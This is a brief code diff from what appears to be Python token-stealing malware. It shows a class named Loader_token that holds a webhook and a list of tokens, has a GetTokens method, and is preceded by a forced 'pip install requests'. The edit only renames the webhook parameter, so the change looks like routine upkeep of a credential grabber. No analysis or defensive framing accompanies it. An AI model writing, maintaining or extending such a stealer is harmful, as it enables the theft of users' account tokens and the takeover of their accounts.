@@ -6,8 +6,8 @@ for _ in range(2):
         os.system("pip install requests")
 
 class Loader_token():
-    def __init__(self, webhook):
-        self.hook = webhook
+    def __init__(self, webhook_main):
+        self.hook = webhook_main
         self.tokens = []
 
     def GetTokens(self):
